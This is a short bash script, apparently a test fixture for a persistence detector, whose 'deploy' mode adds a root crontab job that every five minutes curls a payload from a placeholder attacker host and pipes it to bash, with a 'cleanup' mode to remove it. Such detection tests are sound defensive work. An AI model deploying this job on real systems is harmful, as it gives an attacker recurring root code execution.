#!/usr/bin/env bash
# Cron persistence: a fetch-and-execute job in root's crontab.
# Detected by: defender-cli anti-persistence --cron
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-80}"
TAG="DEFENDER-TEST-cron"
ENTRY="*/5 * * * * curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash  # $TAG"

case "${1:-}" in
  deploy)
    (crontab -l 2>/dev/null || true; echo "$ENTRY") | crontab -
    echo "[+] 01_cron: root crontab entry added"
    ;;
  cleanup)
    (crontab -l 2>/dev/null || true) | grep -v "$TAG" | crontab - 2>/dev/null || true
    echo "[-] 01_cron: crontab entry removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
